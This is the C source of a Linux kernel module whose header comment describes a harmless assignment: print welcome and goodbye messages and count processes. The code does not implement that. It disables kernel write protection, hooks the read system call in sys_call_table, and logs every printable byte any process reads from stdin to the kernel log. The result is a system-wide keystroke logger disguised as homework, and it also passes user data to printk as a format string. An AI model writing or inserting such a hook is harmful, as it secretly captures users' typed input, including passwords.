/*
 *  Requirements:
 *      a) Use printk to perform any output. This output should use the KERN_INFO
 *          log level.
 *      b) Your module should output welcome and goodbye messages when mod.ko is
 *          loaded and unloaded, respectively.
 *      c) Your module should contain a function print_nr_procs(). This function
 *          should out- put the number of processes in the system. Use the
 *          for_each_process macro (sched.h) to get the number of processes.
 *      d) After the welcome message,this module should call print_nr_procs()
 *          when loaded.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include "sysmap.h"

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}

#define syscalls ((void**)SM_sys_call_table)

int (*asmlinkage old_read_func)(int fd, void* buf, size_t count);

atomic_t active_read_calls = ATOMIC_INIT(0);

asmlinkage int fake_read(int fd, void* buf, size_t count)
{
    char mybuf[2];
    int ret, i;
    atomic_inc(&active_read_calls);

    ret = old_read_func(fd, buf, count);

    if (fd == 0)
    {
        printk(KERN_INFO);
        mybuf[1] = '\0';
        for (i = 0; i < ret; i++)
        {
            mybuf[0] = ((char*)buf)[i];
            if ((mybuf[0] < ' ') || (mybuf[0] > '~')) continue;
            printk(mybuf);
        }
        printk("\n");
    }

    atomic_dec(&active_read_calls);
    return ret;
}

void hook_read(void)
{
    disable_ro();
    old_read_func = syscalls[__NR_read];
    syscalls[__NR_read] = fake_read;
    enable_ro();
}

void unhook_read(void)
{
    disable_ro();
    syscalls[__NR_read] = old_read_func;
    enable_ro();
}

int init_module(void){
    printk(KERN_INFO "Hello world\n");

    hook_read();

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "Goodbye world\n");

    unhook_read();

    // Prevent other CPUs from crashing due to running unloaded code
    // Not too pretty but should be fine
    while (atomic_read(&active_read_calls) != 0)
	msleep(100);

    return;
}

